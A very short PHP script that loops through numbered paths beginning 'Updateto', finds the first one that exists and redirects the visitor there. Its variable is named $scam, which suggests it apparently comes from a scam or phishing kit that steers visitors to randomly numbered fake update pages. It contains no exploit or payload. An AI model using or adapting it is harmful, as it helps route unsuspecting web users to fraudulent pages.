<?php
$scam = "Updateto";
for($i=0;$i<9999999;$i++){
if(file_exists($scam.$i)){
header('location:'.$scam.$i);
exit;
}
}
?>